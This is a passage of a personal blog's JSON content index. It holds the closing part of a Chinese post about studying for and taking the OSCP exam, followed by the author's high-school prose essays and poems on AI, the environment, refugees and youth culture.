隻靶機時，靶機會召喚一面牆壁。請同學開始撞牆，會撞得頭破血流。同學務必取出修禪的心繼續撞、用力撞、撞開那面牆壁，建議同學在面對牆壁時盡可能不要請求援助，靠自己的力量撞牆，如果撞了 2、3 天還是撞不開的同學可以嘗試請求援助。 撞開牆壁後的同學，在料理第 31~ 隻靶機時速度會提升，表示已經具有相應能力。同學可以不用料理完所有靶機便能準備預約 OSCP 考試。我料理完 40 隻靶機後便預約考試了。 🦉 叛逆的黑夜料理人 - Tonya #\r以下是 Tonya 在考試時的叛逆或者不叛逆的行為，替後來的同學驗證了一些奇怪的事情，如果有疑慮請務必不要參考。\n考試前預先詢問是否能使用 Notion 筆記，得到允許後考試時使用。 考試中忘記詢問是否能使用 HackMD 筆記，考試時使用。 每隔一小時就出去休息 10 分鐘。 提早 8 小時結束考試去睡覺。 把住在同一個房間的弟弟趕去睡客廳。 每一台考試靶機都解兩次。第一次正常解、第二次邊解邊截圖。 🦉 鳴謝 #\r在我的學習過程中，特別感謝兩位 GPT（Steven Meow GPT \u0026amp; Red Meow GPT）在我想不透的時候引導我許多切入點或教我很多奇怪的知識。我也再次驗證一件事，最重要跟最有用的知識從來就不在課本上。這也很契合 OSCP 的主旨，除了滲透測試的能力外要培養的便是獨立解決問題的能力。此外，修禪的心也非常重要，越急躁只會適得其反，望後來者能深切體會到這句話的重量。\n🎃 來自 DEVCORE 的一小碗雞湯 #\rAllen Own ：『大家都在成長，知道自己的不足也是一種成長。』 Ginoah：『對我們來說，所有技術都是為了挖洞。沒有什麼用不到的，滲透測試也是挖洞的一個過程。』 ","date":"8 January 2023","externalUrl":null,"permalink":"/blogs/oscp/","section":"Blogs","summary":"","title":"Journey of Learning OSCP","type":"blogs"},{"content":"","date":"1 January 2018","externalUrl":null,"permalink":"/categories/prose/","section":"Categories","summary":"","title":"Prose","type":"categories"},{"content":"\r存一些高中寫過的黑歷史散文。其實還有詩，但先不要。\r","date":"1 January 2018","externalUrl":null,"permalink":"/prose/","section":"Prose","summary":"","title":"Prose","type":"prose"},{"content":"\r👼 我相信著 #\r在不久的未來，AI將帶領我們。 屆時的城市，無人駕駛將減少交通事故的發生， 智能管家使生活變得輕鬆便利， 智慧樓宇讓居住變得更加安全。 當AI帶給我們美好未來的同時，也為我賺進源源不絕的財富，延及後代的子子孫孫。 請別懷疑，我所說的即是天使的呢喃， 地底的石油，只要挖掘便源源不絕； 森林的木材，儘管砍伐其數量不減； 工廠的汙水，只要排放入海便毫無蹤跡。 人類千百年來皆是如此，未來也將繼續如此。 如果哪天，地球資源真的枯竭，世界將邁向毀滅，請賭上你們驕傲的「人工」智慧之名。 為我駕駛穿越毀滅的太空船，翱向宇宙中無盡的繁星， 替曾經美麗的地球劃下終點，前往其他星球繼續書寫我們的歷史。\n😈 我相信著 #\r在不久的未來，AI將領航世界。 儘管我的時間已所剩無幾，但仍衷心盼望那時的世界 沒有因貪婪發動的戰爭、 因暖化融化的冰川、 因大火焚燒的森林。 在AI帶給人類更便利生活的同時，請留一份未經汙染的桃花源給予追隨我千百年的動植物們。 也請小心，勿聽信惡魔的低吟， 在我曾經蔚藍的海洋，任一朵朵塑膠袋追逐嬉戲悠游海中； 在我曾經蓊鬱的山林，任一棵棵易開罐雨後春筍植滿山坡； 在我曾經清朗的天空，任一根根煙囪吞雲吐霧染黑蒼穹。 如果哪天，真的抵擋不住惡魔的誘惑，請賭上你們驕傲的人工「智慧」之名， 用無盡的飛彈為世界降下一次浩劫與重生，劃下我長久以來渴望的終點與嶄新的起點。\n👼😈我們期望著 #\r我們期望著、堅信著AI必將改變一切，這是趨勢也是進步的過程。 邁向未來的倒數計時已無法停止，人工智慧已然誕生，時間軸步步進逼，面對AI世界，我們同樣盼望著的未來，是否有同樣的結局? 無論是否聽信天使或惡魔，我們都將共同背負起我們的未來。\n","date":"1 January 2018","externalUrl":null,"permalink":"/prose/ai_poem/","section":"Prose","summary":"","title":"你說的對，但是 AI","type":"prose"},{"content":"\r👑初聞金質 #\r時值歲末，細雨綿綿，寒風凜冽。聖誕佳節方去不遠，期末已悄然接近，依稀可見歲暮除夕之色，新春大年之景。禁不住時光匆匆之傷感、無所事事之扼腕，於是悲從中來。申時五刻，入圖書館尋藏書，巧遇主任，一番寒暄下偶聞大安金質，又驚又喜。驚不才見識匪淺，卻喜得良機更上層樓。邀約之下，於是應允，皇天后土為證，白紙黑字為據，提筆簽字，後離去。逢大考，與其徒入書庫，覓文學、尋史料，國英數社，無所不閱。正當沉浸之際，忽有靈光乍現，方憶起金質。於是應邀，六人成行。朝來暮去，俯仰之間舊年已去。時逢雨水，莘莘學子歷寒霜洗禮，經滄海桑田，一番鍛鍊，書香氣息更勝以往。接獲金質旨意時，已身懷萬卷書、行萬里路。頗有唐宋古文八大家之風。於是自號資訊六才子，一行人踏入漫遊閱讀金質領域。\n👑初次與會 #\r諶克寧師誨我等閱之深、教我等學之廣，識我等此世之大，並共勉之。更於一段午後，深入文學根本水牛書店收穫羅文嘉師之歷，暢遊臺灣過去未來。於書店外參與闖關活動，一路上過五關斬六將，大破關主，奪魁。為六才子首戰打響名號。一番歷練，精、氣、神無不升至無我境界，受益良多。後備受禮遇，更得三漫遊閱讀與會之優先權，欣喜交織。三大領域皆漫遊後，與以往相較下，更顯成長。行文為學雖浩瀚無垠，然以廣泛閱讀為媒介，輔以金質為陣，終將鍊出獨步天下之歷練。鍊金術其皆遵循等價交換，若付出時間，何不能得成長?\n👑紺紫之帛 #\r祖父曾贈與一物，用以勉吾，為一紺紫之帛，為黑中透紅之紗。其義為，恆保勇，恆堅持，恆進取。今多方閱讀，提升寫作，一番心力後，回頭看此帛紗，是否稍微接近那紺野之境?想必木棉早已了然於心。日後也將努力不懈，持續成長，以報紺野木棉之恩。\n","date":"30 May 2017","externalUrl":null,"permalink":"/prose/a_diary/","section":"Prose","summary":"","title":"記一次金質旅","type":"prose"},{"content":"\r🪽我逃離我的家 #\r坦克佇立在曾經的康莊大道，烽火染指了敘利亞的天空，黑翼掠過天邊，撒下了鮮紅色的血淚。我受威尼斯的洗禮，航向地中海淵遠的傳說，波賽頓在海城中笑看我落荒的樣子，我才知道宙斯只屬於希臘人。苟延殘喘爬向進行曲的國度，土耳其的另一邊不再有戰爭。艾菲爾上的陽光洗滌破碎的身軀，當我最終航向不列顛，時間卻已永遠停在了午夜。破曉的鐘響不再響起，而當最終投入大西洋的懷抱，我才知道，沙灘上熟睡的小男孩，早已折斷自由之翼。\n🪽我逃離我的家 #\r手機與錢包在絨毛大衣的口袋中睡得香甜，霧霾遮蔽了台北的天空，重機咻過耳邊，聽不見地球彼端的悲鳴。躲進網咖，戰場上殺敵無數，奪下一個個的國家，亞歷山大的雄心壯志將由我繼承。吹著空調，一碗碗的泡麵、一本本的漫畫，長征的物資從不缺乏。而當月亮高掛，鈴聲響起，才心不甘情不願地回想起那過多的管教與嘮叨，只好暫時撤退，明日再度奔向自由。\n🪽不斷地逃，不斷地掙扎 #\r直到視線模糊只剩痛苦，才了解人們本無須殺戮。而當我們厭惡了父母的關心、看倦了四書五經，想逃離現實，卻不知道，聽不見悲鳴的我們，正將他人燃盡生命追求的事物，棄若敝屣地踐踏。 一樣寫做逃離，一樣讀做自由，而想擺脫與想追求的卻大相逕庭。我們是幸福的，幸福到害怕失去，然而只有曾經失去，才懂得珍惜。明日同樣會到來，是時候該勇敢面對了，為了自己，也為了那些在追逐幸福中墜落的人。\n","date":"28 March 2017","externalUrl":null,"permalink":"/prose/sun_rain/","section":"Prose","summary":"","title":"悲歡對照","type":"prose"},{"content":"\r✡️解開塵封已久的封印 #\r玩具盒中，拾起幾張遊戲卡片，拉勾約定打遍各校的稚語，銘刻於泛黃的卡片，飄盪在記憶深處； 翻開幾月未見的畢業紀念冊，憶起會考前，雙手把玩著魔術方塊，僅僅六色組合卻苦思到白髮蒼蒼，誇口十秒完成的戲言，也隨著脫落的貼紙，凋零在書頁一角； 點開一夜未讀的訊息，昨晚的對決戰況依舊是話題主軸，短兵相接、金戈鐵馬，大話談笑間灰飛煙滅的強虜，又是一夜平凡的日常。 如同季節更替，動漫流行的風潮遞嬗更迭。昔日，我所追尋的風，而今又吹向何方？\n✡️沉醉於夢 #\r那是詩人豪傑共抒的感慨，何嘗不想留於桃花源，或愜於醉翁亭？ 我總是陶醉在書中。記得數年前，動漫產業在新世代間掀起一陣狂風，〈進擊的巨人〉席捲青少年族群。 偶爾帶上幾本漫畫躲在教室一隅，把風的、偵查的、戒備的，一班特種部隊不去斬殺巨人，而是為躲避教官而生。當時的我，不過是隨風起舞的小草罷了。 沉浸於漫畫以及各式各樣的小說。 普天下，有誰不想在金庸筆下稱一方霸主？在輕小說中做一個追夢人？ 看盡中國風花雪月，卻習不得降龍十八掌； 算盡數學萬千組合，卻參不透過去未來； 遍覽古人思想風華，卻讀不懂人心是非。 課業完敗於小說，我也屈服於對想像的憧憬，顧不得課堂上理清了些什麼，又習得了什麼。\n✡️夢醒時分 #\r最是痛，大澈大悟也已是大考之後。付出慘痛的代價，品嘗失敗，才驚覺，一味追逐著流行的我，早已迷失在虛假的真實中，尋不著歸途。看不穿披上錯誤的真理，犧牲了睡眠，放棄了知識，奔向自由的同時，卻親手為自己戴上了桎梏。這才赫見，巨人們早已被時間所拋棄，消失在同儕的談話間。取而代之的，是閃耀於天際的星辰。午夜夢迴，往何處觀天象，往何處逐繁星，早已成為每節下課的話題。只可惜，當我在寂靜的夜晚孤獨地攜著望遠鏡觀星象時，他們全聚集到桃園機場追星了。\n✡️昨日種種譬如昨日死 #\r如果不能重來，那就汲取曾經的錯誤，轉化為面對未來的力量。與其向上蒼祈願逝去的機會，不如抹去眼淚，待破曉黎明浴火重生。我不能點石成金，但可以化知識為力量；我不能遨遊在宇宙間，但卻能暢遊浩瀚書海；我無法擁有一次永恆，但我擁有無數個瞬間。驀然回首，原來，我所追逐、嚮往的世界近在眼前，伸手可觸。而當風向漸轉，我知道，是換季的時候了。只是，若已然踐履過無數春去秋來、季節更替，似乎寒冬與炎夏也無太大差別了。\n✡️流行是風 #\r風往哪吹，草往哪倒。也許追逐流行是生活的一種方式，但在蔚藍無垠的蒼穹下，隨著一朵白雲起舞，不如覓一朵烏雲，淋著屬於自己的細雨，不去和別人爭陽光朗照。如果安於聽雨，何苦隨夸父追日呢？「你聽你的鳥鳴，他看他的日出，彼此都會有等量的美的感受」時代步步進逼，流行的風向也時刻改變。明日，吹的是甚麼風？唯己能知!\n","date":"24 November 2016","externalUrl":null,"permalink":"/prose/walk_talk/","section":"Prose","summary":"","title":"我行、我訴","type":"prose"},{"content":"\r要來一點其他朋友的 Blog 不?\rTaiYou\u0026rsquo;s Blog\n","externalUrl":null,"permalink":"/friends/","section":"Friend Links","summary":"","title":"Friend Links","type":"friends"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]